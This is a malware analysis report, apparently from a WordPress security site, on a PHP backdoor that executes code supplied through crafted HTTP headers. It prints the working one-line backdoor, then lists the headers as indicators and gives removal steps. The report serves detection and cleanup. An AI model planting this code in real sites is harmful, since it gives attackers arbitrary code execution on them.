---
title: 'Header-Based Backdoor Malware'
slug: 'header-based-backdoor-injection'
metaDescription: 'Technical breakdown of the X-Dns-Prefetch-Control header backdoor. Learn how attackers use HTTP headers to execute zero-day PHP code without leaving local file traces.'
reportDate: '2026-01-24'
threatType: 'Backdoor'
severity: 'High'
fileHash: 'php-header-execution-backdoor-x-dns-prefetch'
detectedPaths: ['sample.php']
screenshots:
  [
    '/images/wordpress-threats/php-header-execution-backdoor-x-dns-prefetch_evidence-1.png',
  ]
vtLink: 'https://www.virustotal.com/gui/home/upload'
vtScore: 'Zero-Day (Unique)'
impact: 'The backdoor provides attackers with complete control over the site, allowing for execution of arbitrary PHP code, leading to potential data theft, unauthorized access, or server compromise.'
seenOn: 'Active themes and plugins'
behavior: 'Executes arbitrary PHP code upon receiving specially crafted HTTP headers.'
difficulty: 'Moderate'
recurrence: 'Medium'
numberOfSiteFixed: 'Include this if the user mentions how many sites they fixed this malware on'
---

## Technical Analysis

The malware is a 'Header-Based Backdoor' injected into PHP files at the beginning, following the '<?php' tag. It leverages HTTP headers to execute malicious code. Specifically, it leverages 'X-Dns-Prefetch-Control' to dynamically create a function (likely using 'create_function'), uses 'If-Unmodified-Since' to decode a payload with 'base64_decode', and 'Feature-Policy' to carry the encoded PHP payload/script. This allows attackers to execute arbitrary PHP code without leaving obvious footprints in the files themselves, as the malicious code is not stored on the server but activated via HTTP headers.

> **VirusTotal Analysis:** 🛡️ **Zero-Day / Fully Undetected.**

## Attack Chain

1. A malicious request is sent with specific HTTP headers.
2. The script checks for 'X-Dns-Prefetch-Control', 'If-Unmodified-Since', and 'Feature-Policy' headers.
3. If the headers are present, 'create_function' is used to execute the payload decoded by 'base64_decode'.

## Code Signature(s)

### FILE: `sample.php`

```php
$_HEADERS=getallheaders();if(isset($_HEADERS['X-Dns-Prefetch-Control'])){$mb_convert=$_HEADERS['X-Dns-Prefetch-Control']('', $_HEADERS['If-Unmodified-Since']($_HEADERS['Feature-Policy']));$mb_convert();}

```

## Indicators of Compromise (IOCs)

- `X-Dns-Prefetch-Control`
- `If-Unmodified-Since`
- `Feature-Policy`

## Removal Protocol

1. Scan all PHP files in active themes and plugins to locate the injected backdoor code.
1. Remove the malicious code from the top of affected PHP files.
1. Update WordPress, themes, and plugins to the latest versions to patch vulnerabilities.

> **Status:** Active Threat.  
> **Verification:** Verified by MD Pabel.
